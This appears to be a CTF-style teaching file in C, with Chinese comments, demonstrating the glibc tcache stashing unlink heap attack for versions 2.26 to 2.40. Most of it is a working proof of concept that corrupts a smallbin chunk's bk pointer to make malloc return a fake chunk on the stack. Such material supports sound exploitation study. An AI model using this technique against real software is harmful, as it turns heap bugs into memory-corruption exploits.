/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_stashing_unlink_attack
 * 文件标注范围：2.26 ~ 2.40
 * 模拟漏洞：可以改写 smallbin chunk 的 bk 指针，前提是对应尺寸的 tcache 必须为空。
 * 核心流程：calloc/malloc 从 smallbin 里取块服务请求时，会把多余的节点顺手 stash 进 tcache，
 *   这个过程中会执行 bck->fd 的写入，也就有机会把一个伪造节点链进 tcache。
 * 成功判据：目标地址被写入了 main_arena 指针，并且这个伪造节点能被后续的 malloc 取回；
 *   2.41 重构了 smallbin 到 tcache 的流程后，这种经典形式就不再成立了。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    // stack_var 用来承载我们希望 malloc 最终返回的伪 chunk，周围的字段要按 smallbin 节点的布局来摆放。

    stack_var[3] = (unsigned long)(&stack_var[2]);

    // 先申请 9 个同尺寸的 chunk：其中 7 个用来填满 tcache，另外 2 个进入 unsorted bin 后再参与 smallbin 的操作。
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    // 释放前 7 个 chunk，把这个尺寸对应的 tcache bin 填满。

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    // 这是最后一个能进入 tcache 的节点；之后再释放同尺寸的块就会绕过 tcache 了。
    free(chunk_lis[1]);
    // tcache 已经满了，所以接下来释放的两个 chunk 会先进入 unsorted bin。
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    // 用一个这些块都满足不了的较大请求触发分类，把 unsorted bin 里的目标块移入 smallbin。

    malloc(0xa0);// size > 0x90

    // 从 tcache 里取走两个节点，让这个尺寸的桶只剩 5 个空闲块，为后面的 stashing 腾出两个槽位。

    malloc(0x90);
    malloc(0x90);

    // 漏洞模拟：覆盖 victim->bk，让 smallbin stashing 的反向遍历走到栈上的伪 chunk。
    /* 漏洞模拟开始/结束 */
    chunk_lis[2][1] = (unsigned long)stack_var;
    /* 漏洞模拟开始/结束 */

    // 申请一个走 calloc 路径的同尺寸块，触发 smallbin 解链和随之而来的 tcache stashing 写入。

    calloc(1,0x90);

    // 再申请一次，从 tcache 里取出刚才暂存的伪节点，返回的正是栈上 fake chunk 的用户区。
    target = malloc(0x90);

    assert(target == &stack_var[2]);
    return 0;
}
